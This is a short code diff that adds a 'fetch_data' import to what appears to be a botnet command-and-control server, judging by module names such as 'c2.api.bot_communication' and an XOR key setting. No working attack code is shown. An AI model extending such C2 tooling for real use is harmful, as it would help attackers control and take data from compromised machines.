@@ -19,5 +19,6 @@ app.xor_key = 0x7f
 from c2.api import auth
 from c2.api import bot_communication
 from c2.api import action
+from c2.api import fetch_data
 from c2.database import dbmain
 dbmain.initdb()
